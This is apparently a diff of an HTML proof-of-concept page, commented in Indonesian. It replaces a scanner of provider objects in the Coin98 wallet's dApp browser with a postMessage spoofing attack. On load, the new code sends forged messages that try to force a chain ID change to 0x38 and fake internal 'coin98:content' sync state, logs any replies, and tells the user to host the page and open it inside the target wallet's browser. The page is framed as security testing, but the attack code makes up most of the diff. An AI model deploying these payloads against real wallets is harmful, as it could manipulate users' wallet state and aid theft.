@@ -2,82 +2,72 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Coin98 dApp Browser Security Scanner PoC</title>
+    <title>postMessage Cross-Origin Spoofing PoC</title>
     <script>
         function log(msg, color = "black") {
-            console.log("[Coin98-Scanner] " + msg);
+            console.log("[PoC-MessageSpoof] " + msg);
             const div = document.createElement('div');
             div.style.color = color;
             div.style.margin = "4px 0";
             div.style.fontFamily = "monospace";
-            div.style.fontSize = "12px";
+            div.style.fontSize = "11px";
             div.style.wordBreak = "break-all";
             div.style.fontWeight = (color === "red" || color === "#d00") ? "bold" : "normal";
             div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
             document.body.prepend(div);
         }
 
-        // Fungsi untuk memindai objek global yang tersedia pada window di lingkungan Coin98
-        function scanGlobalEnvironment() {
-            log("--- Memulai Pemindaian Lingkungan WebView Coin98 ---", "blue");
-            
-            const commonProviders = [
-                'ethereum', 
-                'coin98', 
-                'coin98sol', 
-                'solana', 
-                'phantasma', 
-                'web3'
-            ];
+        // 1. Menyerang / Mengirimkan pesan palsu (Spoofed Message Injection) ke jendela aplikasi
+        function sendSpoofedMessages() {
+            log("[*] Memulai pengiriman payload postMessage palsu...", "blue");
 
-            commonProviders.forEach(providerName => {
-                if (window[providerName]) {
-                    log(`[+] Ditemukan objek global: window.${providerName}`, "green");
-                    
-                    // Cek properti di dalam objek tersebut
-                    try {
-                        const keys = Object.getOwnPropertyNames(window[providerName]);
-                        log(`    -> Properti/Metode tersedia: ${keys.slice(0, 10).join(', ')}`, "purple");
-                    } catch (e) {
-                        log(`    -> Gagal membaca properti internal ${providerName}`, "orange");
-                    }
-                } else {
-                    log(`[-] Tidak ditemukan: window.${providerName}`, "#666");
-                }
-            });
+            // Payload 1: Manipulasi legacy_chainId ke jaringan arbitrer (misalnya Chain ID lain / 0x38 / BSC)
+            const maliciousPayload1 = {
+                name: "legacy_chainId",
+                payload: "0x38" // Mencoba memaksa perubahan rantai secara ilegal
+            };
+
+            // Payload 2: Memalsukan status sinkronisasi internal
+            const maliciousPayload2 = {
+                target: "coin98:content",
+                data: "SYN_ACK_FORCED_BY_ATTACKER"
+            };
+
+            try {
+                // Mengirim pesan ke window utama / parent tempat aplikasi berjalan
+                window.postMessage(maliciousPayload1, "*");
+                log("🚨 Berhasil mengirim spoofed payload 1 (legacy_chainId: 0x38)", "#d00");
+
+                window.postMessage(maliciousPayload2, "*");
+                log("🚨 Berhasil mengirim spoofed payload 2 (SYN injection)", "#d00");
+            } catch (e) {
+                log("[-] Gagal mengirim postMessage: " + e.message, "gray");
+            }
         }
 
-        // Memantau komunikasi postMessage masuk dan keluar
-        function setupPostMessageListener() {
-            window.addEventListener('message', function(event) {
-                try {
-                    const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
-                    if (dataStr) {
-                        log(`[Incoming postMessage] ${dataStr.substring(0, 120)}`, "teal");
-                    }
-                } catch (e) {}
-            });
-            log("[+] Listener postMessage terpasang.", "green");
-        }
+        // 2. Mendengarkan respons balik atau perubahan status akibat injeksi pesan
+        window.addEventListener('message', function(event) {
+            log(`[← Response Terdeteksi] Origin: ${event.origin} | Data: ${JSON.stringify(event.data)}`, "purple");
+        });
 
         window.onload = function() {
-            log("Coin98 Security Scanner PoC Dimuat.");
-            scanGlobalEnvironment();
-            setupPostMessageListener();
+            log("=== postMessage Spoofing PoC Loaded ===");
+            // Berikan jeda sejenak lalu tembakkan payload
+            setTimeout(sendSpoofedMessages, 1500);
         };
     </script>
 </head>
-<body style="padding:15px; font-family:Arial; background-color: #f9f9f9;">
-    <h3 style="color: #111; margin-top:0;">Coin98 dApp Browser Scanner PoC</h3>
-    <p style="color: #555; font-size: 13px;">Alat uji mandiri untuk memetakan objek jembatan dan eksposur API di dalam peramban dApp Coin98 Wallet.</p>
-    <hr style="border:0; border-top:1px solid #ccc; margin:10px 0;">
+<body style="padding:15px; font-family:Arial; background-color: #fff4f4;">
+    <h3 style="color: #c00; margin-top:0;">postMessage Spoofing PoC (Real-World Test)</h3>
+    <p style="color: #333; font-size: 13px;">Skrip ini menguji apakah aplikasi rentan menerima pesan lintas *origin* tanpa validasi ketat.</p>
+    <hr style="border:0; border-top:1px solid #cc0000; margin:10px 0;">
     
-    <div style="background: #fff; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-top: 10px;">
-        <h4 style="margin: 0 0 8px 0; color: #333;">Petunjuk Penggunaan:</h4>
+    <div style="background: #fff; padding: 10px; border: 1px solid #ffcccc; border-radius: 4px; margin-top: 10px;">
+        <h4 style="margin: 0 0 8px 0; color: #990000;">Instruksi Pengujian:</h4>
         <ol style="margin: 0; padding-left: 20px; font-size: 13px; color: #444;">
-            <li>Unggah kode ini ke server hosting pengujian Anda (mendukung HTTPS).</li>
-            <li>Buka tautannya melalui peramban dApp di dalam aplikasi Coin98 Wallet.</li>
-            <li>Lihat hasil pemindaian pada layar untuk mendeteksi objek *bridge* atau injeksi provider yang aktif di peramban tersebut.</li>
+            <li>Unggah kode ini ke server Anda yang dapat diakses melalui HTTPS.</li>
+            <li>Buka URL tersebut langsung dari dalam dApp browser aplikasi target.</li>
+            <li>Amati log pada layar: Jika aplikasi merespons, mengubah *Chain ID* secara otomatis, atau memproses data palsu tersebut, maka aplikasi terbukti tidak memvalidasi asal pengirim (*origin*) pesan masuk dengan benar.</li>
         </ol>
     </div>
 </body>
